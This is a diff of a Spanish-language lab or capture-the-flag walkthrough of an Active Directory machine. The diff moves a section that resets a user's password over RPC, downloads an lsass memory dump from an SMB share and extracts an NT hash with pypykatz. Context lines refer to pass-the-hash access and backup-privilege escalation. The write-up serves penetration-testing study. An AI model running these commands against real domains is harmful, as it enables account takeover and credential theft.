@@ -60,6 +60,25 @@ nxc smb <DC> -u support -p '<password>' --shares
 - La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
 - El detalle está en «Escalada de privilegios».
 
+`support` tiene permiso para cambiar la contraseña de `audit2020` por RPC:
+
+```bash
+rpcclient -U 'support%<password>' <DC>
+```
+
+```text
+setuserinfo2 audit2020 23 '<NuevaPassword>!'
+```
+
+Con `audit2020` se accede al recurso `forensic`, que contiene un volcado de memoria de `lsass.exe`. Se descarga y se procesa:
+
+```bash
+smbclient //<DC>/forensic -U 'audit2020%<NuevaPassword>!'
+pypykatz lsa minidump lsass.DMP
+```
+
+Del volcado sale el hash NT de `svc_backup`.
+
 ## Escalada de privilegios
 
 `svc_backup` tiene **SeBackupPrivilege** y acceso WinRM:
@@ -114,23 +133,3 @@ El hash de Administrator permite `wmiexec`/`psexec` y leer ambas flags.
 ## Referencias
 
 - [kerberos-enum](../../../knowledge/windows/kerberos-enum.md)
-## De support a audit2020
-
-`support` tiene permiso para cambiar la contraseña de `audit2020` por RPC:
-
-```bash
-rpcclient -U 'support%<password>' <DC>
-```
-
-```text
-setuserinfo2 audit2020 23 '<NuevaPassword>!'
-```
-
-Con `audit2020` se accede al recurso `forensic`, que contiene un volcado de memoria de `lsass.exe`. Se descarga y se procesa:
-
-```bash
-smbclient //<DC>/forensic -U 'audit2020%<NuevaPassword>!'
-pypykatz lsa minidump lsass.DMP
-```
-
-Del volcado sale el hash NT de `svc_backup`.
